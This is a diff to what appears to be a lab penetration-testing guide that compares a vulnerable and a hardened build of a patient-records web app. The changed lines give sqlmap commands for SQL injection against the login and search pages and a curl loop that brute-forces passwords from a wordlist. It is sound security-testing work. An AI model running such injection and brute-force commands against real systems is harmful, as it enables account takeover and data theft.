@@ -89,19 +89,27 @@ Log in once in the browser, copy the `Cookie` header, then:
 # Both builds answer a failed login with HTTP 401, which makes sqlmap stop unless told
 # --ignore-code=401. Without it every login run below ends at once and proves nothing.
 
-# Baseline login (expect: injectable, dumps the users table)
-sqlmap -u "http://192.168.56.10:5444/login" --data="username=x&password=x" -p username \
-       --ignore-code=401 --batch --risk=3 --level=5 --dump -T users
+# --flush-session on every run: they share one output dir, so without it a later target replays an
+# earlier target's cached injection point (a false positive on the hardened build).
 
-# Baseline search (expect: UNION injection). Log in as the RECEPTIONIST (ravi): the baseline
-# only builds the search SQL by string formatting for that role; doctors use a safe query.
-sqlmap -u "http://192.168.56.10:5444/patients/?q=x" --cookie="sh_session=PASTE" --batch --tables
+# Baseline login (expect: injectable). No --dump: the login's 302/401/200 answers confuse sqlmap's
+# oracle, so it falls back to a time-based blind dump that crawls for hours. Confirming the injection
+# is enough; the auth bypass it enables is proved directly by vapt/login_injection_proof.sh.
+sqlmap -u "http://192.168.56.10:5444/login" --data="username=x&password=x" -p username \
+       --ignore-code=401 --flush-session --batch --risk=3 --level=5
+
+# Baseline search (expect: injectable). Log in as the RECEPTIONIST (ravi): the baseline only builds
+# the search SQL by string formatting for that role; doctors use a safe query. sqlmap at default level
+# can still miss it (it only sees the HTTP 500s), so vapt/search_injection_proof.sh proves it directly.
+sqlmap -u "http://192.168.56.10:5444/patients/?q=x" --cookie="sh_session=PASTE" --flush-session --batch --tables
 
 # Hardened login (expect: not injectable). Without --csrf-token every request is refused with 400,
 # and without --delay the 10-per-minute login limit answers 429 - either would make
-# "not injectable" meaningless. The cookie on this build is __Host-sh_session.
+# "not injectable" meaningless. The cookie on this build is __Host-sh_session. In practice the CSRF
+# token (400s) and the single-thread dev-server TLS make sqlmap inconclusive here; the authoritative
+# hardened check is vapt/login_injection_proof.sh (injection payload answered with 401, like a wrong password).
 sqlmap -u "https://192.168.56.10:5443/login" --data="csrf_token=x&username=x&password=x" -p username \
-       --csrf-token=csrf_token --csrf-url="https://192.168.56.10:5443/login" --ignore-code=401 --delay=7 --batch
+       --csrf-token=csrf_token --csrf-url="https://192.168.56.10:5443/login" --ignore-code=401 --delay=7 --flush-session --batch
 
 # Hardened search as ravi (expect: not injectable). Paste the __Host-sh_session value.
 sqlmap -u "https://192.168.56.10:5443/patients/?q=x" -p q --cookie="__Host-sh_session=PASTE" \
@@ -125,14 +133,18 @@ Set Kali's browser proxy to Burp (127.0.0.1:8080), import Burp's CA for the HTTP
 - **Sessions.** Compare the `Set-Cookie` on each build (Proxy > HTTP history). Log out and replay an
   old cookie in Repeater. Baseline: still works. Hardened: redirected to login.
 
-> Burp Community limits Intruder speed. On the **baseline** (no CSRF, no lockout) `hydra` works:
+> Burp Community limits Intruder speed. On the **baseline** a plain loop is the cleanest brute force:
+> hydra's `http-post-form` misreads the baseline's 401-on-failed-login as HTTP auth and logs nothing
+> useful, so `vapt/kali_run.sh` uses curl instead (a wrong password answers 401, the right one 302):
 > ```bash
-> hydra -l anita -P rockyou-top100.txt -s 5444 192.168.56.10 http-post-form \
->   "/login:username=^USER^&password=^PASS^:F=Wrong password"
+> while read pw; do
+>   curl -s -o /dev/null -w "%{http_code} $pw\n" -d "username=ravi" --data-urlencode "password=$pw" \
+>     http://192.168.56.10:5444/login
+> done < rockyou-top100.txt   # none are blocked: no lockout, no rate limit on the baseline
 > ```
-> hydra cannot fetch a fresh CSRF token per request, so against the **hardened** build it only
-> sees 400s. Use Burp Intruder with a macro/session rule that reloads `/login` for the token, or
-> the kit's built-in brute-force test (section 0.1). That the CSRF token defeats naive guessing
+> A fresh CSRF token per request defeats this against the **hardened** build (400s). Use Burp Intruder
+> with a macro/session rule that reloads `/login` for the token, or the kit's built-in brute-force test
+> (section 0.1) — the hardened account locks after 5 tries. That the CSRF token defeats naive guessing
 > tools is itself a finding to note.
 
 ## 5. OWASP ZAP — headers and automated scan
